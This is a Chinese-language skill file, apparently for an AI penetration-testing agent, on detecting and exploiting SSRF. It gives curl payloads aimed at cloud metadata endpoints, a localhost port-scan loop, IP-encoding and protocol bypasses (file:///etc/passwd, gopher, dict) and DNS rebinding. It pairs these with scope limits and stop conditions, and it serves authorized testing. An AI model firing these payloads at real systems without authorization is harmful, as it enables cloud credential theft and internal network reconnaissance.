---
name: ssrf
description: 检测和利用服务端请求伪造（SSRF）漏洞，包括云元数据访问、内网探测和过滤器绕过。
category: web
source: xalgorix
tags:
  - SSRF
  - 云安全
  - 内网探测
  - 协议滥用
required_tools:
  - curl
  - Burp Collaborator 或 Interactsh
---

# SSRF 服务端请求伪造

## 适用场景

- 目标应用支持用户提交 URL（如网页预览、图片代理、Webhook、文件导入）。
- 目标部署在云环境（AWS/GCP/Azure），需要测试元数据端点访问。
- 目标有内部网络，需要通过 SSRF 探测内网服务。

## 授权边界

- **SSRF 可能使目标服务器向内网发起请求，可能触发内部系统的告警或副作用。**
- 内网探测仅扫描常见端口（80/443/8080/8443），不做全端口扫描。
- 云元数据访问仅在 scope 明确允许时测试，且仅验证可访问性，不提取完整凭证。
- Blind SSRF 使用 Burp Collaborator 或 Interactsh 接收回连，不使用个人服务器。

## 前置条件

- 已识别目标应用中接受 URL 输入的功能点。
- Burp Collaborator 或 Interactsh 客户端用于 Blind SSRF 检测。
- 了解目标是否部署在云环境。

## 执行步骤

### 步骤 1：识别 SSRF 入口

```bash
# 常见 SSRF 入口点
# - 网页截图/预览服务：url=, preview=, thumbnail=
# - Webhook 配置：callback=, webhook_url=, notify_url=
# - 文件导入：import_url=, fetch=, load=
# - 图片代理：src=, image_url=, proxy=
# - PDF 生成器：html=, template_url=
```

### 步骤 2：基础 SSRF 检测

```bash
# 使用 Interactsh 获取回连地址
INTERACT=$(interactsh-client -v 2>&1 | grep -oP '[a-z0-9]+\.[a-z0-9]+\.[a-z0-9]+\.[a-z0-9]+' | head -1)

# 测试目标是否发起外部请求
curl -X POST "https://<target>/fetch" \
  -d "url=http://$INTERACT/test"
```

如 Interactsh 收到回连，确认 SSRF 存在。

### 步骤 3：云元数据探测

```bash
# AWS IMDSv1（最常见）
curl -X POST "https://<target>/fetch" \
  -d "url=http://169.254.169.254/latest/meta-data/"

# GCP
curl -X POST "https://<target>/fetch" \
  -d "url=http://metadata.google.internal/computeMetadata/v1/"

# Azure
curl -X POST "https://<target>/fetch" \
  -d "url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  -H "Metadata: true"
```

**仅验证可访问性，不逐级提取完整元数据，除非主代理确认允许。**

### 步骤 4：内网探测

```bash
# 仅扫描常见端口
for port in 80 443 8080 8443 3306 6379 27017; do
  curl -X POST "https://<target>/fetch" \
    -d "url=http://127.0.0.1:$port/" \
    -w "\n$port: %{http_code}\n" -o /dev/null -s
done
```

### 步骤 5：绕过过滤器

```bash
# IP 编码绕过
# 127.0.0.1 的变体：
# 十进制: http://2130706433/
# 八进制: http://0177.0.0.1/
# 十六进制: http://0x7f.0x0.0x0.0x1/
# IPv6: http://[::1]/
# URL 包装: http://localtest.me/ → 127.0.0.1

# 协议绕过
# file:///etc/passwd
# gopher://127.0.0.1:25/_HELO%20localhost
# dict://127.0.0.1:6379/info
```

### 步骤 6：DNS 重绑定测试

如果目标有 URL 白名单，测试 DNS 重绑定：

```bash
# 使用 nip.io 或 xip.io 服务
curl -X POST "https://<target>/fetch" \
  -d "url=http://127.0.0.1.nip.io/"
```

## 停止条件

- 响应中包含云凭证（AWS AccessKeyID、GCP token 等）时立即停止并报告主代理，不要将凭证写入进度记录。
- 内网服务返回了管理后台或敏感页面时，不要继续探索，记录端口和服务类型后报告。
- 目标开始返回 500 或连接超时（可能是内网防护触发），暂停测试。

## 输出格式

- SSRF 入口点列表（功能名称、URL、参数）。
- Interactsh 回连证据（时间和来源 IP）。
- 内网端口扫描结果（仅摘要）。
- 云元数据可访问性结论（是/否/部分）。
- 有效绕过方法（如有）。
- 建议下一步：是否需要深入云环境利用或报告 finding。

## 验收标准

1. 对所有接受 URL 输入的功能点进行了 SSRF 探测。
2. 使用 Interactsh 或 Burp Collaborator 验证了外连能力。
3. 如果 SSRF 确认，至少测试了 cloud metadata 和 localhost 常见端口。
4. 测试了至少 3 种 IP 编码绕过方法。
